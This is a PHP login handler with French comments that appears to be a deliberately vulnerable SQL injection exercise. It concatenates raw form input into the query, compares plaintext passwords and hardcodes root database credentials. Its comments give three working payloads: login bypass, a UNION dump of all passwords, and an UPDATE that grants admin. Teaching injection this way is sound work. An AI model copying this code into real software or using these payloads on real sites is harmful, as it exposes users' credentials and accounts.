<?php
session_start(); // Démarrer la session

$host = 'localhost:3308';
$user = 'root';
$password = 'root';
$database = 'login_system';

$conn = new mysqli($host, $user, $password, $database);

// Vérifier la connexion
if ($conn->connect_error) {
    die("Échec de la connexion : " . $conn->connect_error);
}

// Récupération des données du formulaire (⚠️ Vulnérable aux injections SQL)
$username = $_POST["username"];
$password = $_POST["password"];



// Suppression de la protection contre les injections SQL (⚠️ Dangereux)
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $conn->query($sql);



// 🔥 TEST 1 : Connexion avec `' OR '1'='1' --` 🔥
/*
Si tu mets dans le champ "Nom d'utilisateur" :
' OR '1'='1' -- 
La requête devient :
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = ''
Cela connecte n'importe quel utilisateur sans mot de passe.
*/

// 🔥 TEST 2 : Récupérer tous les utilisateurs avec `UNION SELECT` 🔥
/*
Mettre dans "Nom d'utilisateur" :
// ' UNION SELECT id, username, password, rule FROM users -- 
La requête devient :
SELECT * FROM users WHERE username = '' UNION SELECT id, username, password, rule FROM users -- ' AND password = ''
Cela affiche tous les utilisateurs et leurs mots de passe !
*/

// 🔥 TEST 3 : Modifier un compte avec `UPDATE` 🔥
/*
Mettre dans "Nom d'utilisateur" :
'; UPDATE users SET rule='admin' WHERE username='victime' -- 
Cela change le rôle de "victime" en administrateur !
*/

if ($result->num_rows > 0) {
    $_SESSION['user'] = $result->fetch_assoc(); // Stocker les infos utilisateur
    header("Location: dashboard.php"); // Rediriger vers le dashboard
    exit();
} else {
    header("Location: login.html?error=1"); // Rediriger avec une erreur
    exit();
}

$conn->close();
?>
